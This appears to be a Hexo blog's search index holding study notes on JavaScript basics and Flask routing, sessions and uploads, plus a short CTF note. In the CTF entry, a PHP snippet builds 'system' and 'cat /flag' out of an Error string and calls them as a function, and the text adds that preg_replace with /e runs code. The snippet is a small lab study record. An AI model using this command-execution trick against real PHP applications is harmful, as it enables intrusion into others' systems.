class="hljs-string">&quot;我在控制台喔&quot;</span>);向控制台输出一个内容</span></span><br><span class="javascript"><span class="xml">    </span></span><br><span class="javascript"><span class="xml">    可以将js代码编写到外部文件中  xxx.js</span></span><br><span class="javascript"><span class="xml">然后使用同目录下script标签将文件引入</span></span><br><span class="javascript"><span class="xml">     &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;js/xxx.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">     写在外部文件中可以在不同的页面中同时使用，也可以利用浏览器的缓存机制</span><br><span class="xml">    一旦用于引用外部文件此script就不能再编写代码了，写了没用</span><br><span class="xml">    换一个script标签</span><br><span class="xml">    </span><br><span class="xml">    </span><br><span class="xml">    --&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml">     <span class="hljs-comment">&lt;!---可以将js代买编写到标签的onclick属性中</span></span><br><span class="hljs-comment"><span class="xml">    &lt;button onclick=&quot;alert(&#x27;讨厌，点我干嘛&#x27;);&quot;&gt;点我一下&lt;/button&gt;</span></span><br><span class="hljs-comment"><span class="xml">     &lt;a href=&quot;javascript:alert(&#x27;让你点你就点？&#x27;)&quot;&gt;&lt;/a&gt;</span></span><br><span class="hljs-comment"><span class="xml"></span></span><br><span class="hljs-comment"><span class="xml">     --&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"></span><br><span class="xml"></span><br><span class="xml">a.toString()转化为字符串，但对 undefine , null 无效</span><br><span class="xml">String(a)同上并有效</span><br><span class="xml"></span><br><span class="xml">parseInt(a,10)针对字符串a转化为int型，10进制，10可选</span><br><span class="xml">parseFloat同理</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>-study</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>flask study</title>
    <link href="/2021/11/22/flask-study/"/>
    <url>/2021/11/22/flask-study/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_world</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;Hello, World!&lt;/p&gt;&quot;</span><br>    <br> ^   <br> |<br> |&lt;------最小的一个应用，启动如下<br><span class="hljs-built_in">set</span> FLASK_APP=hello<br>flask run<br> * Running on http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">5000</span>/<br> <br> <br>flask run 内部可见(<span class="hljs-string">&#x27;只允许本地访问&#x27;</span>)<br>flask run --host=<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> 外部可见( <span class="hljs-string">&#x27;操作系统将监听所有公开访问的IP地址&#x27;</span>)<br>  <br>  <span class="hljs-comment">#Flask 提供了一个 run 命令，该命令用来以开发服务器运行应用。 在开发模式下，开发服务器提供交互式调试器，并在代码更改时重新加载。推荐使用 flask run 命令行脚本运行开发服务器。这需要设置 FLASK_APP 环境变量指向您的应用，且设置 FLASK_ENV=development ， 以用于启用开发模式。</span><br>  <br> <span class="hljs-built_in">set</span> FLASK_APP=hello    <span class="hljs-comment">#(py文件名)</span><br> <br><span class="hljs-comment">#如果需要打开所有开发功能，那么需要在运行 flask run 之前设置 FLASK_ENV 环境变量为 development :</span><br><span class="hljs-built_in">set</span> FLASK_ENV=development<br>flask run<br><br><span class="hljs-comment">#通过&lt;float:num&gt;,&lt;int:num&gt;,&lt;string:username&gt;,可以选定输入的值的类型，同一个url,定义不同的输入类型输入函数，可以输出不同的结果</span><br>如:<br><span class="hljs-comment">#输入浮点数执行第二个，输入字符串执行第一个，输入整型会返回404</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_hello_name</span>(<span class="hljs-params">username</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;hello <span class="hljs-subst">&#123;escape(username)&#125;</span>&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;float:num&gt;&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_float</span>(<span class="hljs-params">num</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(num*<span class="hljs-number">39</span>)<br> <br><span class="hljs-comment">#使用 redirect() 函数可以重定向。使用 abort() 可以 更早退出请求，并返回错误代码</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> abort, redirect, url_for<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    abort(<span class="hljs-number">401</span>)<br>    this_is_never_executed()<br><span class="hljs-comment">#上例实际上是没有意义的，它让一个用户从索引页重定向到一个无法访问的页面（401 表示禁止访问）。但是上例可以说明重定向和出错跳出是如何工作的。  </span><br><br><br><br><span class="hljs-comment">#本地环境变量：https://dormousehole.readthedocs.io/en/latest/quickstart.html#context-locals</span><br>  <br>    <br>    <br><span class="hljs-comment">#url_for() 函数用于--------构建指定函数的URL--------它把函数名称作为第一个 参数。它可以接受任意个关键字参数，每个关键字参数对应 URL 中的变量。未知变量 将添加到 URL 中作为查询参数。  </span><br><span class="hljs-comment">#使用特定的 &#x27;static&#x27; 端点就可以生成相应的 URL</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_file_url/&lt;filename&gt;&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_file_url</span>(<span class="hljs-params">filename</span>):</span><br>    <span class="hljs-keyword">return</span> url_for(<span class="hljs-string">&#x27;static&#x27;</span>, filename=filename)<br><br><span class="hljs-comment">#redirect重定向到上面get_url_for函数，并传参显示/get_file_url/网页的内容</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_file/&lt;filename&gt;&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_file</span>(<span class="hljs-params">filename</span>):</span><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;get_file_url&#x27;</span>, filename=filename))<br>  <br> <br><span class="hljs-comment">#模板渲染  from flask import render_template</span><br><span class="hljs-comment">#使用 render_template() 方法可以渲染模板，只需提供模板名称和需要作为参数传递给模板的变量就行了</span><br><span class="hljs-string">&#x27;render_template的功能是对先引入index.html，同时根据后面传入的参数，对html进行修改渲染,见文末超链接&#x27;</span><br><br><br><br><br><br><br><br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_form_data&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_form_data</span>():</span><br>    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> request.form  <span class="hljs-comment">#显示提交的所有表单内容</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;it just a get&#x27;</span><br><br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_args&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_args</span>():</span><br>    <span class="hljs-keyword">return</span> request.args   <span class="hljs-comment">#返回所有通过get提交方式提交的内容</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_request_info&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_request_info</span>():</span><br>    <span class="hljs-keyword">return</span> request.path+<span class="hljs-string">&#x27;\n&#x27;</span>+request.method <span class="hljs-comment">#返回/get_request_info POST/GET</span><br><br><br><span class="hljs-comment">#form提交表单代码    </span><br>&lt;form action=<span class="hljs-string">&quot;http://127.0.0.1:5000/upload_file&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>      &lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>      &lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload&quot;</span>&gt;<br>&lt;/form&gt; <br><br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename  <span class="hljs-comment">#引入secure_filename以原文件命名</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload_file&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_file</span>():</span><br>    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:<br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        file.save(<span class="hljs-string">f&quot;D://myproject/<span class="hljs-subst">&#123;secure_filename(file.filename)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;it just a white&#x27;</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> make_response<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_cookies&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_cookie</span>():</span><br>    res=make_response(<span class="hljs-string">&#x27;cookie&#x27;</span>,<span class="hljs-number">200</span>)<br>    res.set_cookie(<span class="hljs-string">&#x27;kai wang&#x27;</span>,<span class="hljs-string">&#x27;a hansome boy&#x27;</span>)<br>    <span class="hljs-keyword">return</span> (res)<br><br><br><span class="hljs-comment">#make_response()</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> make_response<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/learn_response&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">learn_response</span>():</span><br>    res=make_response(<span class="hljs-string">&#x27;Resopnse Ok&#x27;</span>,<span class="hljs-number">200</span>)<br>    res.headers[<span class="hljs-string">&#x27;Some Data&#x27;</span>]=<span class="hljs-string">&#x27;data&#x27;</span><br>    <span class="hljs-keyword">return</span> (res)<br><br><br><br><span class="hljs-comment">#task  要求版本</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> session<br><br><span class="hljs-comment"># Set the secret key to some random bytes. Keep this really secret!</span><br>app.secret_key = <span class="hljs-string">b&#x27;_5#y2L&quot;F4Q8z\n\xec]/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ind&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index2</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;hello! <span class="hljs-subst">&#123;session[<span class="hljs-string">&quot;username&quot;</span>]&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello！Customer&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login/&lt;username&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">username</span>):</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Login Succeed <span class="hljs-subst">&#123;username&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not get&#x27;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    <span class="hljs-comment"># remove the username from the session if it&#x27;s there</span><br>    session.pop(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;logout successfully&#x27;</span><br><br><br><br><span class="hljs-comment">#重定向再看一下,注意路径别冲突</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> session<br><br><span class="hljs-comment"># Set the secret key to some random bytes. Keep this really secret!</span><br>app.secret_key = <span class="hljs-string">b&#x27;_5#y2L&quot;F4Q8z\n\xec]/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Logged in as <span class="hljs-subst">&#123;session[<span class="hljs-string">&quot;username&quot;</span>]&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are not logged in&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        session[<span class="hljs-string">&#x27;username&#x27;</span>] = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            &lt;p&gt;&lt;input type=text name=username&gt;</span><br><span class="hljs-string">            &lt;p&gt;&lt;input type=submit value=Login&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    <span class="hljs-comment"># remove the username from the session if it&#x27;s there</span><br>    session.pop(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br><br><br><br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/yy19890521/article/details/81034765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163788640416780265497170%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163788640416780265497170&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-81034765.pc_search_all_es&utm_term=flask+render_template()+&spm=1018.2226.3001.4187">render_template</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>-study</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>a happy question</title>
    <link href="/2021/09/16/%E5%90%A7%E5%94%A7/"/>
    <url>/2021/09/16/%E5%90%A7%E5%94%A7/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">ROIS web first easyphp<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$class</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;system cat /flag&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$class</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;------&#x27;</span>;<br>    <span class="hljs-variable">$str1</span>=substr(<span class="hljs-variable">$class</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>);<br>    <span class="hljs-variable">$str2</span>=substr(<span class="hljs-variable">$class</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>);<br><span class="hljs-comment">//    $c=&quot;system&quot;;</span><br><span class="hljs-comment">//    $d=&quot;ipconfig&quot;;</span><br><span class="hljs-comment">//    $c($d);</span><br><span class="hljs-comment">//    var_dump($c);</span><br><span class="hljs-comment">//    var_dump($str1);</span><br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br><span class="hljs-comment">//$a = &#x27;system&#x27;;</span><br><span class="hljs-comment">//    (&#x27;system&#x27;)(&#x27;ipconfig&#x27;);</span><br></code></pre></td></tr></table></figure><p><a href="https://segmentfault.com/a/1190000018991087">php伪协议</a></p><p>preg_replace()：</p><p>函数最后以/e结尾时，会存在命令执行漏洞，也就是说如果有/e，并且匹配到符合正则表达式的字符串，那么第二个参数的字符串将被当做代码来执行</p>]]></content>
    
    
    
    <tags>
      
      <tag>-一个记录的flag</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/09/16/hello-world/"/>
    <url>/2021/09/16/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
